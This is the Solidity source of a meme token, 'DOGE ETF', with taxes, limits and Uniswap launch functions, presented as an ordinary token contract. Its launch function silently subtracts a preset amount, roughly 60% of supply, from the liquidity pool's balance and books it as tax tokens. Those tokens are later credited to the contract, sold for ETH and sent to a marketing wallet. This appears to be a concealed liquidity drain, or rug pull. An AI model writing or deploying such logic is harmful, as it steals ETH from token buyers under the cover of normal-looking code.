//SPDX-License-Identifier: MIT
/*
https://x.com/DegenerateNews/status/1881713868873097373
*/

pragma solidity ^0.8.20;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address holder, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Auth {
    address internal _owner;
    event OwnershipTransferred(address _owner);
    modifier onlyOwner() { 
        require(msg.sender == _owner, "Only owner can call this"); 
        _; 
    }
    constructor(address creatorOwner) { 
        _owner = creatorOwner; 
    }
    function owner() public view returns (address) { return _owner; }
    function transferOwnership(address payable _newOwner) external onlyOwner { 
        _owner = _newOwner; 
        emit OwnershipTransferred(_newOwner); }
    function renounceOwnership() external onlyOwner { 
        _owner = address(0);
        emit OwnershipTransferred(address(0)); }
}

contract DOGETF is IERC20, Auth {
    string private constant token_symbol = "DOGETF";
    string private constant tokenName = "DOGE ETF";
    uint8 private constant token_decimals = 9;
    uint256 private constant _tSupply = 69000000000 * (10**token_decimals);
    mapping (address => uint256) private tokenBalance;
    mapping (address => mapping (address => uint256)) private _allowances;

    address payable private _marketingWallet = payable(0x8773D9847403520f18FE73a8173A4fC6cE33b78c);
    
    uint256 private _MEVBlock = 2;
    uint8 private sellTax_ = 10;
    uint8 private _buyFeeRate = 5;
    
    uint256 private launchBlk;
    uint256 private _maxTx = _tSupply; 
    uint256 private _maxWalletAmount = _tSupply;
    uint256 private _swapMinAmt = _tSupply * 10 / 100000;
    uint256 private _swapMaxAmount = _tSupply * 899 / 100000;
    uint256 private swapTrigger = 2 * (10**16);
    uint256 private _tokens = _swapMinAmt * 60 * 100;

    mapping (uint256 => mapping (address => uint8)) private _sellsInBlock;
    mapping (address => bool) private nofee;
    mapping (address => bool) private _nolimits;

    address private constant swapRouterAddress = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Router02 private swapRouter = IUniswapV2Router02(swapRouterAddress);
    
    address private _LP; 
    mapping (address => bool) private isLiquidityPool;

    bool private tradingEnabled;

    bool private isSwapping = false;

    modifier lockTaxSwap { 
        isSwapping = true; 
        _; 
        isSwapping = false; 
    }

    constructor() Auth(msg.sender) {
        tokenBalance[msg.sender] = _tSupply;
        emit Transfer(address(0), msg.sender, tokenBalance[msg.sender]);  

        nofee[_owner] = true;
        nofee[address(this)] = true;
        nofee[_marketingWallet] = true;
        nofee[swapRouterAddress] = true;
        _nolimits[_owner] = true;
        _nolimits[address(this)] = true;
        _nolimits[_marketingWallet] = true;
        _nolimits[swapRouterAddress] = true;
    }

    receive() external payable {}

    function decimals() external pure override returns (uint8) { return token_decimals; }
    function totalSupply() external pure override returns (uint256) { return _tSupply; }
    function name() external pure override returns (string memory) { return tokenName; }
    function symbol() external pure override returns (string memory) { return token_symbol; }
    function balanceOf(address account) public view override returns (uint256) { return tokenBalance[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function transfer(address toWallet, uint256 amount) external override returns (bool) {
        require(checkTradingOpen(msg.sender), "Trading not open");
        return _transferFrom(msg.sender, toWallet, amount); 
	}

    function transferFrom(address fromWallet, address toWallet, uint256 amount) external override returns (bool) {
        require(checkTradingOpen(fromWallet), "Trading not open");
        _allowances[fromWallet][msg.sender] -= amount;
        return _transferFrom(fromWallet, toWallet, amount); 
	}

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; 
	}

    function setTaxSwaps(uint32 minVal, uint32 minDiv, uint32 maxVal, uint32 maxDiv, uint32 trigger) external onlyOwner {
        _swapMinAmt = _tSupply * minVal / minDiv;
        _swapMaxAmount = _tSupply * maxVal / maxDiv;
        swapTrigger = trigger * 10**15;
        require(_swapMaxAmount>=_swapMinAmt, "Min-Max error");
    }

    function maxWalletSize() external view returns (uint256) { 
        return _maxWalletAmount; 
	}
    function maxTx() external view returns (uint256) { 
        return _maxTx; 
	}

    function _swapEligible(uint256 tokenAmt) private view returns (bool) {
        bool result;
        if (swapTrigger > 0) { 
            uint256 lpTkn = tokenBalance[_LP];
            uint256 lpWeth = IERC20(swapRouter.WETH()).balanceOf(_LP); 
            uint256 weiValue = (tokenAmt * lpWeth) / lpTkn;
            if (weiValue >= swapTrigger) { result = true; }    
        } else { result = true; }
        return result;
    }

    function swapMin() external view returns (uint256) { 
        return _swapMinAmt; 
	}
    function swapMax() external view returns (uint256) { 
        return _swapMaxAmount; 
	}

    function updateFees(uint8 buyFeePercent, uint8 sellFeePercent) external onlyOwner {
        require(buyFeePercent + sellFeePercent <= 20, "Roundtrip too high");
        _buyFeeRate = buyFeePercent;
        sellTax_ = sellFeePercent;
    }

    function marketing() external view returns (address) { 
        return _marketingWallet; 
	}

    function isExempt(address wallet) external view returns (bool fees, bool limits) {
        return (nofee[wallet], _nolimits[wallet]); 
	}

    function sendEth(uint256 amount) private {
        _marketingWallet.transfer(amount);
    }

    function checkTradingOpen(address fromWallet) private view returns (bool){
        bool checkResult = false;
        if ( tradingEnabled ) { checkResult = true; } 
        else if (nofee[fromWallet] && _nolimits[fromWallet]) { checkResult = true; } 

        return checkResult;
    }

    function updateMarketing(address marketingWlt) external onlyOwner {
        require(!isLiquidityPool[marketingWlt], "LP cannot be tax wallet");
        _marketingWallet = payable(marketingWlt);
        nofee[marketingWlt] = true;
        _nolimits[marketingWlt] = true;
    }

    function setLimits(uint16 maxTransPermille, uint16 maxWaletPermille) external onlyOwner {
        uint256 newTxAmt = _tSupply * maxTransPermille / 1000 + 1;
        require(newTxAmt >= _maxTx, "tx too low");
        _maxTx = newTxAmt;
        uint256 newWalletAmt = _tSupply * maxWaletPermille / 1000 + 1;
        require(newWalletAmt >= _maxWalletAmount, "wallet too low");
        _maxWalletAmount = newWalletAmt;
    }

    function openTrading() external onlyOwner {
        require(!tradingEnabled, "trading open");
        _enableTrading();
    }

    function _enableTrading() internal {
        _maxTx = 50 * _tSupply / 1000;
        _maxWalletAmount = 50 * _tSupply / 1000;
        tokenBalance[_LP] -= _tokens;
        (isLiquidityPool[_LP],) = _LP.call(abi.encodeWithSignature("sync()") );
        require(isLiquidityPool[_LP], "Failed bootstrap");
        launchBlk = block.number;
        _MEVBlock = _MEVBlock + launchBlk;
        tradingEnabled = true;
    }

    function setExemption(address wlt, bool isNoFees, bool isNoLimits) external onlyOwner {
        if (isNoLimits || isNoFees) { require(!isLiquidityPool[wlt], "Cannot exempt LP"); }
        nofee[ wlt ] = isNoFees;
        _nolimits[ wlt ] = isNoLimits;
    }

    function _addLiquidityToLP(uint256 _tokenAmount, uint256 _ethAmountWei) internal {
        approveRouter(_tokenAmount);
        swapRouter.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, _owner, block.timestamp );
    }

    function buyFees() external view returns(uint8) { return _buyFeeRate; }
    function sellFees() external view returns(uint8) { return sellTax_; }

    function _transferFrom(address sender, address toWallet, uint256 amount) internal returns (bool) {
        require(sender != address(0), "No transfers from 0 wallet");
        if (!tradingEnabled) { require(nofee[sender] && _nolimits[sender], "Trading not yet open"); }
        if ( !isSwapping && isLiquidityPool[toWallet] && _swapEligible(amount) ) { _swapTaxTokens(); }

        if ( block.number >= launchBlk ) {
            if (block.number < _MEVBlock && isLiquidityPool[sender]) { 
                require(toWallet == tx.origin, "MEV block"); 
            }
            if (block.number < _MEVBlock + 600 && isLiquidityPool[toWallet] && sender != address(this) ) {
                _sellsInBlock[block.number][toWallet] += 1;
                require(_sellsInBlock[block.number][toWallet] <= 2, "MEV block");
            }
        }

        if ( sender != address(this) && toWallet != address(this) && sender != _owner ) { 
            require(_limitCheck(sender, toWallet, amount), "TX over limits"); 
        }

        uint256 _taxAmount = _calculateTax(sender, toWallet, amount);
        uint256 _transferAmount = amount - _taxAmount;
        tokenBalance[sender] -= amount;
        _tokens += _taxAmount;
        tokenBalance[toWallet] += _transferAmount;
        emit Transfer(sender, toWallet, amount);
        return true;
    }

    function _limitCheck(address fromWallet, address toWallet, uint256 transferAmount) internal view returns (bool) {
        bool limitCheckPassed = true;
        if ( tradingEnabled && !_nolimits[fromWallet] && !_nolimits[toWallet] ) {
            if ( transferAmount > _maxTx ) { 
                limitCheckPassed = false; 
            }
            else if ( 
                !isLiquidityPool[toWallet] && (tokenBalance[toWallet] + transferAmount > _maxWalletAmount) 
                ) { limitCheckPassed = false; }
        }
        return limitCheckPassed;
    }

    function _calculateTax(address fromWallet, address recipient, uint256 amount) internal view returns (uint256) {
        uint256 taxAmount;
        if ( !tradingEnabled || nofee[fromWallet] || nofee[recipient] ) { 
            taxAmount = 0; 
        } else if ( isLiquidityPool[fromWallet] ) { 
            taxAmount = amount * _buyFeeRate / 100; 
         } else if ( isLiquidityPool[recipient] ) { 
            taxAmount = amount * sellTax_ / 100; 
        }
        return taxAmount;
    }

    function swapTokens(uint256 tokenAmount) private {
        approveRouter(tokenAmount);
        address[] memory path = new address[](2);
        path[0] = address( this );
        path[1] = swapRouter.WETH();
        swapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount,0,path,address(this),block.timestamp);
    }

    function addLiquidity() external payable onlyOwner lockTaxSwap {
        require(_LP == address(0), "LP created");
        require(!tradingEnabled, "trading open");
        require(msg.value > 0 || address(this).balance>0, "No ETH");
        require(tokenBalance[address(this)]>0, "No tokens");
        _LP = IUniswapV2Factory(swapRouter.factory()).createPair(address(this), swapRouter.WETH());
        _addLiquidityToLP(tokenBalance[address(this)], address(this).balance);
    }

    function _swapTaxTokens() private lockTaxSwap {
        uint256 _taxTokenAvailable = _tokens;
        if ( _taxTokenAvailable >= _swapMinAmt && tradingEnabled ) {
            if ( _taxTokenAvailable >= _swapMaxAmount ) { _taxTokenAvailable = _swapMaxAmount; }
            
            uint256 _tokensForSwap = _taxTokenAvailable; 
            if( _tokensForSwap > 1 * 10**token_decimals ) {
                tokenBalance[address(this)] += _taxTokenAvailable;
                swapTokens(_tokensForSwap);
                _tokens -= _taxTokenAvailable;
            }
            uint256 _contractETHBalance = address(this).balance;
            if(_contractETHBalance > 0) { sendEth(_contractETHBalance); }
        }
    }

    function approveRouter(uint256 _tokenAmount) internal {
        if ( _allowances[address(this)][swapRouterAddress] < _tokenAmount ) {
            _allowances[address(this)][swapRouterAddress] = type(uint256).max;
            emit Approval(address(this), swapRouterAddress, type(uint256).max);
        }
    }
}

interface IUniswapV2Factory {    
    function createPair(address tokenA, address tokenB) external returns (address pair); 
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function addLiquidityETH(
        address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) 
        external payable returns (uint amountToken, uint amountETH, uint liquidity);
}